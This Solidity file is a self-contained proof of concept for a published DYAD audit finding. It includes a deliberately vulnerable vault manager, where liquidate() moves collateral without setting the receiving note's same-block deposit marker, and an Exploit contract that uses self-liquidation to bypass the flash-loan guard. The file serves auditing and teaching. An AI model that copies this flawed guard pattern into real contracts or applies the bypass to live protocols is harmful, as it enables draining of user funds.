// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DYAD — [H-10] Flash loan protection mechanism can be bypassed via
    self-liquidations (Code4rena 2024-04-dyad, reporter carrotsmuggler,
    finding #33466).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: VaultManagerV2 blocks a same-block deposit-then-withdraw on
    the SAME note id via `idToBlockOfLastDeposit` -- but `liquidate()` moves
    collateral to a DIFFERENT note id via `vault.move()` WITHOUT ever setting
    that receiving id's `idToBlockOfLastDeposit`. So collateral that arrived
    this very block via a (self-)liquidation can be withdrawn immediately,
    in the SAME block, from the receiving note -- a full flash-loan-funded
    deposit-and-withdraw round trip that the guard was specifically built to
    prevent.

    This reduction isolates the bypass mechanism itself (the two blamed
    snippets, verbatim, marked `@> VULN`) rather than the full multi-account
    Kerosene-price-manipulation narrative used to make the liquidation
    trigger naturally -- the report itself treats that price-manipulation
    precondition as "a separate issue" from the guard bypass reported here.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 mock standing in for the flash-loaned collateral token.
///      The flash-loan mechanics themselves are not the vulnerable part --
///      only the round-trip within one block matters here.
contract MockWeth {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced DYAD collateral vault, keyed by note id (the real system
///         keys collateral by a `DNft` id; that ownership layer is not the
///         vulnerable part and is omitted here).
contract Vault {
    address public manager;
    MockWeth public token;
    mapping(uint256 => uint256) public balanceOf; // note id => collateral units

    modifier onlyManager() {
        require(msg.sender == manager, "only manager");
        _;
    }

    constructor(address _manager, MockWeth _token) {
        manager = _manager;
        token = _token;
    }

    /// @dev PoC-only wiring helper to break the Vault<->VaultManagerV2
    ///      constructor circular dependency; not part of the vulnerable logic.
    function setManager(address _manager) external {
        manager = _manager;
    }

    function deposit(uint256 id, uint256 amount) external onlyManager {
        balanceOf[id] += amount;
    }

    function withdraw(uint256 id, uint256 amount, address to) external onlyManager {
        balanceOf[id] -= amount;
        token.transfer(to, amount);
    }

    /// @dev Verbatim companion to the report's `liquidate` snippet: moves
    /// collateral between note ids on the manager's instruction.
    function move(uint256 id, uint256 to, uint256 amount) external onlyManager {
        balanceOf[id] -= amount;
        balanceOf[to] += amount;
    }
}

/// @notice Reduced VaultManagerV2: deposit/withdraw with the flash-loan
///         same-block guard, plus liquidate() which moves collateral without
///         refreshing the receiving note's guard marker.
contract VaultManagerV2 {
    Vault public vault;
    MockWeth public weth;

    mapping(uint256 => uint256) public idToBlockOfLastDeposit;
    mapping(uint256 => bool) public liquidatable; // PoC-only hook standing in for the real collat-ratio check

    constructor(Vault _vault, MockWeth _weth) {
        vault = _vault;
        weth = _weth;
    }

    function deposit(uint256 id, uint256 amount) external {
        weth.transferFrom(msg.sender, address(vault), amount);
        vault.deposit(id, amount);
        // @> VULN (companion): the flash-loan-protection marker is set here...
        idToBlockOfLastDeposit[id] = block.number;
    }

    function withdraw(uint256 id, uint256 amount, address to) external {
        // @> VULN: ...and checked ONLY here, on the SAME id. A note that
        // received collateral this block via `liquidate()` -> `vault.move()`
        // was never marked, so this check silently passes for it.
        if (idToBlockOfLastDeposit[id] == block.number) revert("DepositedInSameBlock");
        vault.withdraw(id, amount, to);
    }

    /// @dev PoC-only stand-in for the real collateral-ratio computation
    ///      (kerosene-price manipulation, discussed as a separate issue by
    ///      the report itself); the guard-bypass mechanism below does not
    ///      depend on HOW a note became liquidatable, only THAT it did.
    function setLiquidatable(uint256 id, bool v) external {
        liquidatable[id] = v;
    }

    // @> VULN: liquidate() moves the FULL collateral balance to `to` via
    // `vault.move()` but never touches `idToBlockOfLastDeposit[to]` --
    // the receiving note's flash-loan guard marker is left exactly as it
    // was before this block, even though it just received fresh collateral.
    function liquidate(uint256 id, uint256 to) external {
        require(liquidatable[id], "not liquidatable");
        uint256 collateral = vault.balanceOf(id);
        vault.move(id, to, collateral);
        liquidatable[id] = false;
    }
}

contract Exploit {
    MockWeth public weth;
    Vault public vault;
    VaultManagerV2 public manager;

    uint256 public constant ID_A = 1; // flashloan-funded note (deposit target)
    uint256 public constant ID_B = 2; // liquidation-receiving note (withdraw target)
    uint256 public constant FLASH_AMOUNT = 1 ether;

    constructor() {
        weth = new MockWeth();
        vault = new Vault(address(0), weth);
        manager = new VaultManagerV2(vault, weth);
        vault.setManager(address(manager));
    }

    function run() external {
        // Step 1: Alice takes out a flashloan and deposits it into note A.
        weth.mint(address(this), FLASH_AMOUNT);
        manager.deposit(ID_A, FLASH_AMOUNT);
        require(vault.balanceOf(ID_A) == FLASH_AMOUNT, "A funded");
        require(manager.idToBlockOfLastDeposit(ID_A) == block.number, "A's guard marker set this block");

        // Control: a DIRECT same-block withdraw from A is correctly blocked
        // by the flash-loan guard.
        (bool directOk, ) = address(manager).call(
            abi.encodeWithSelector(VaultManagerV2.withdraw.selector, ID_A, FLASH_AMOUNT, address(this))
        );
        require(!directOk, "control: direct same-block withdraw from A is blocked, as designed");
        require(vault.balanceOf(ID_A) == FLASH_AMOUNT, "control: A's collateral untouched after the blocked attempt");

        // Step 2: (In the real attack this is reached by manipulating the
        // Kerosene price via separate accounts, discussed as its own issue.)
        // Note A becomes liquidatable.
        manager.setLiquidatable(ID_A, true);

        // Step 3: Alice liquidates herself, moving A's collateral to B.
        manager.liquidate(ID_A, ID_B);
        require(vault.balanceOf(ID_A) == 0, "A's collateral moved out");
        require(vault.balanceOf(ID_B) == FLASH_AMOUNT, "B received A's collateral, still within this same block");
        require(manager.idToBlockOfLastDeposit(ID_B) != block.number, "harm precondition: B's guard marker was never refreshed");

        // Step 4: Alice withdraws from B in the SAME block -- the bypass.
        manager.withdraw(ID_B, FLASH_AMOUNT, address(this));

        // HARM: a full deposit-then-withdraw round trip of the flash-loaned
        // funds completed within a single block -- exactly what the guard
        // exists to prevent -- achieved purely by routing the funds through
        // a (self-)liquidation instead of a direct withdrawal.
        require(weth.balanceOf(address(this)) == FLASH_AMOUNT, "harm: flashloaned funds fully recovered within the same block");
        require(vault.balanceOf(ID_B) == 0, "harm: B's collateral fully withdrawn despite arriving this same block");
    }
}
